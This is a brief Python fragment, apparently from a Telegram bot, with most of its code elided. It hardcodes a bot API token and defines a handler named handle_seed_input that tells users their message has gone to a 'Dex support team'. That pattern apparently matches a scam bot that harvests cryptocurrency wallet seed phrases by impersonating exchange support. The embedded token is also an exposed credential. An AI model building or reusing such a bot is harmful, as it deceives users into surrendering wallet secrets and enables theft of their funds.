...
TOKEN = "7543623280:AAExL_Vz1gjbwUVOqj8_aNNC-CiNCJhds1A"
...
async def handle_seed_input(update: Update, context: CallbackContext) -> int:
    ...
    await update.message.reply_text("Your Message has been sent to our Dex support team. They will respond to you shortly! Please Wait......")
